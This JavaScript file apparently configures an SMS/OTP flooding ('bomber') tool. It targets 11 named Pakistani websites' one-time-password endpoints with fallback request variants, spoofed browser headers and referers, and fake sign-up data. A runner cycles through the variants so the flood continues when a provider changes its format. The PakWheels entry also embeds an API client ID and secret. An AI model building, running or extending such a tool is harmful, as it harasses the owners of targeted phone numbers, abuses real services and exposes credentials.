/**
 * 11 Pakistani OTP endpoints.
 * Each endpoint carries multiple payload variants — the runner tries them in order
 * and stops at the first accepted one, so payload drift on the provider side
 * does not kill the whole run.
 */

const UA =
  'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36';

const baseHeaders = {
  'user-agent': UA,
  accept: 'application/json, text/plain, */*',
  'accept-language': 'en-PK,en;q=0.9,ur;q=0.8',
  'accept-encoding': 'gzip, deflate, br',
  'sec-fetch-site': 'same-site',
  'sec-fetch-mode': 'cors',
  'sec-fetch-dest': 'empty',
};

const H = (origin, referer, extra = {}) => ({
  ...baseHeaders,
  origin,
  referer,
  ...extra,
});

const rnd = () => Math.random().toString(36).slice(2, 8);

export const ENDPOINTS = [
  {
    id: 1,
    name: 'PakWheels',
    url: 'https://www.pakwheels.com/login-with-mobile.json?client_id=37952d7752aae22726aff51be531cddd&client_secret=014a5bc91e1c0f3af4ea6dfaa7eee413&api_version=18',
    variants: [
      (n) => ({
        method: 'POST',
        headers: H('https://www.pakwheels.com', 'https://www.pakwheels.com/', {
          'content-type': 'application/json',
        }),
        json: { mobile_number: n.local, country_code: '92', api_version: 18 },
      }),
      (n) => ({
        method: 'POST',
        headers: H('https://www.pakwheels.com', 'https://www.pakwheels.com/', {
          'content-type': 'application/x-www-form-urlencoded',
        }),
        form: { mobile_number: n.local, country_code: '92' },
      }),
      (n) => ({
        method: 'POST',
        headers: H('https://www.pakwheels.com', 'https://www.pakwheels.com/', {
          'content-type': 'application/json',
        }),
        json: { mobile: n.local },
      }),
    ],
  },
  {
    id: 2,
    name: 'Sastaticket',
    url: 'https://backend.sastaticket.pk/api/v3/users/generate_otp/',
    variants: [
      (n) => ({
        method: 'POST',
        headers: H('https://www.sastaticket.pk', 'https://www.sastaticket.pk/', {
          'content-type': 'application/json',
        }),
        json: { mobile: n.local, country_code: '+92', type: 'login', platform: 'web' },
      }),
      (n) => ({
        method: 'POST',
        headers: H('https://www.sastaticket.pk', 'https://www.sastaticket.pk/', {
          'content-type': 'application/json',
        }),
        json: { msisdn: n.local, country_code: '92' },
      }),
      (n) => ({
        method: 'POST',
        headers: H('https://www.sastaticket.pk', 'https://www.sastaticket.pk/', {
          'content-type': 'application/x-www-form-urlencoded',
        }),
        form: { mobile: n.local },
      }),
    ],
  },
  {
    id: 3,
    name: 'NayaBazar',
    url: 'https://nayabazar.pk/controllers/login-by-phone',
    variants: [
      (n) => ({
        method: 'POST',
        headers: H('https://nayabazar.pk', 'https://nayabazar.pk/login', {
          'content-type': 'application/x-www-form-urlencoded',
          'x-requested-with': 'XMLHttpRequest',
        }),
        form: { phone: n.local, country_code: '92', action: 'send_otp' },
      }),
      (n) => ({
        method: 'POST',
        headers: H('https://nayabazar.pk', 'https://nayabazar.pk/login', {
          'content-type': 'application/json',
          'x-requested-with': 'XMLHttpRequest',
        }),
        json: { phone: n.local },
      }),
      (n) => ({
        method: 'POST',
        headers: H('https://nayabazar.pk', 'https://nayabazar.pk/login', {
          'content-type': 'application/x-www-form-urlencoded',
          'x-requested-with': 'XMLHttpRequest',
        }),
        form: { mobile: n.local },
      }),
    ],
  },
  {
    id: 4,
    name: 'Oraan',
    url: 'https://baseapi.oraan.com/api/users/send-otp',
    variants: [
      (n) => ({
        method: 'POST',
        headers: H('https://oraan.com', 'https://oraan.com/', {
          'content-type': 'application/json',
        }),
        json: { phone: n.local, country_code: '92', type: 'signup' },
      }),
      (n) => ({
        method: 'POST',
        headers: H('https://oraan.com', 'https://oraan.com/', {
          'content-type': 'application/json',
        }),
        json: { phone_number: n.local, country_code: '92' },
      }),
      (n) => ({
        method: 'POST',
        headers: H('https://oraan.com', 'https://oraan.com/', {
          'content-type': 'application/x-www-form-urlencoded',
        }),
        form: { phone: n.local },
      }),
    ],
  },
  {
    id: 5,
    name: 'WeatherWalay',
    url: 'https://app.weatherwalay.com/webapp/otp/send-otp',
    variants: [
      (n) => ({
        method: 'POST',
        headers: H('https://app.weatherwalay.com', 'https://app.weatherwalay.com/', {
          'content-type': 'application/json',
        }),
        json: { phone: n.local, country_code: '92' },
      }),
      (n) => ({
        method: 'POST',
        headers: H('https://app.weatherwalay.com', 'https://app.weatherwalay.com/', {
          'content-type': 'application/json',
        }),
        json: { mobile: n.local },
      }),
      (n) => ({
        method: 'POST',
        headers: H('https://app.weatherwalay.com', 'https://app.weatherwalay.com/', {
          'content-type': 'application/x-www-form-urlencoded',
        }),
        form: { phone: n.local },
      }),
    ],
  },
  {
    id: 6,
    name: 'Cheezious',
    url: 'https://api.cheezious.com/v1/customers/sendOtp',
    variants: [
      (n) => ({
        method: 'POST',
        headers: H('https://cheezious.com', 'https://cheezious.com/', {
          'content-type': 'application/json',
        }),
        json: { phone: n.local, country_code: '92' },
      }),
      (n) => ({
        method: 'POST',
        headers: H('https://cheezious.com', 'https://cheezious.com/', {
          'content-type': 'application/json',
        }),
        json: { mobileNumber: n.local },
      }),
      (n) => ({
        method: 'POST',
        headers: H('https://cheezious.com', 'https://cheezious.com/', {
          'content-type': 'application/x-www-form-urlencoded',
        }),
        form: { phone: n.local },
      }),
    ],
  },
  {
    id: 7,
    name: 'ForeeFix',
    url: 'https://foreefix.com/foreefix-api/api/web_user_register',
    variants: [
      (n) => ({
        method: 'POST',
        headers: H('https://foreefix.com', 'https://foreefix.com/register', {
          'content-type': 'application/json',
        }),
        json: {
          name: 'Ali ' + rnd(),
          email: `user${rnd()}${Date.now() % 10000}@gmail.com`,
          phone: n.local,
          mobile: n.local,
          country_code: '92',
          password: 'Abc12345',
          role: 'customer',
        },
      }),
      (n) => ({
        method: 'POST',
        headers: H('https://foreefix.com', 'https://foreefix.com/register', {
          'content-type': 'application/json',
        }),
        json: {
          full_name: 'Ali ' + rnd(),
          email: `u${rnd()}@gmail.com`,
          mobile: n.local,
          country_code: '+92',
        },
      }),
    ],
  },
  {
    id: 8,
    name: 'Udhaar',
    url: 'https://web.udhaar.pk/udhaar/dukaan/create/sendotp/',
    variants: [
      (n) => ({
        method: 'POST',
        headers: H('https://web.udhaar.pk', 'https://web.udhaar.pk/', {
          'content-type': 'application/x-www-form-urlencoded',
          'x-requested-with': 'XMLHttpRequest',
        }),
        form: { mobile_number: n.local, country_code: '92' },
      }),
      (n) => ({
        method: 'POST',
        headers: H('https://web.udhaar.pk', 'https://web.udhaar.pk/', {
          'content-type': 'application/x-www-form-urlencoded',
          'x-requested-with': 'XMLHttpRequest',
        }),
        form: { phone: n.local },
      }),
    ],
  },
  {
    id: 9,
    name: 'Portall',
    url: 'https://portallapp.com/api/v1/auth/generate-otp-web',
    variants: [
      (n) => ({
        method: 'POST',
        headers: H('https://portallapp.com', 'https://portallapp.com/', {
          'content-type': 'application/json',
        }),
        json: { phone: n.local, country_code: '+92' },
      }),
      (n) => ({
        method: 'POST',
        headers: H('https://portallapp.com', 'https://portallapp.com/', {
          'content-type': 'application/json',
        }),
        json: { mobile: n.local, country_code: '92' },
      }),
    ],
  },
  {
    id: 10,
    name: 'PriceOye',
    url: 'https://priceoye.pk/shoppers/generate_shopper_otp',
    variants: [
      (n) => ({
        method: 'POST',
        headers: H('https://priceoye.pk', 'https://priceoye.pk/', {
          'content-type': 'application/json',
          'x-requested-with': 'XMLHttpRequest',
        }),
        json: { mobile: n.local, country_code: '92' },
      }),
      (n) => ({
        method: 'POST',
        headers: H('https://priceoye.pk', 'https://priceoye.pk/', {
          'content-type': 'application/x-www-form-urlencoded',
          'x-requested-with': 'XMLHttpRequest',
        }),
        form: { mobile: n.local },
      }),
    ],
  },
  {
    id: 11,
    name: 'Broadway Pizza',
    url: 'https://services.broadwaypizza.com.pk/BroadwayAPI.aspx',
    variants: [
      (n) => ({
        method: 'GET',
        headers: H('https://www.broadwaypizza.com.pk', 'https://www.broadwaypizza.com.pk/'),
        url: `https://services.broadwaypizza.com.pk/BroadwayAPI.aspx?method=CheckNumber&Number=${n.local}`,
      }),
      (n) => ({
        method: 'GET',
        headers: H('https://www.broadwaypizza.com.pk', 'https://www.broadwaypizza.com.pk/'),
        url: `https://services.broadwaypizza.com.pk/BroadwayAPI.aspx?method=CheckNumber&Number=${n.plus}`,
      }),
    ],
  },
];

export const ENDPOINT_MAP = new Map(ENDPOINTS.map((e) => [e.id, e]));
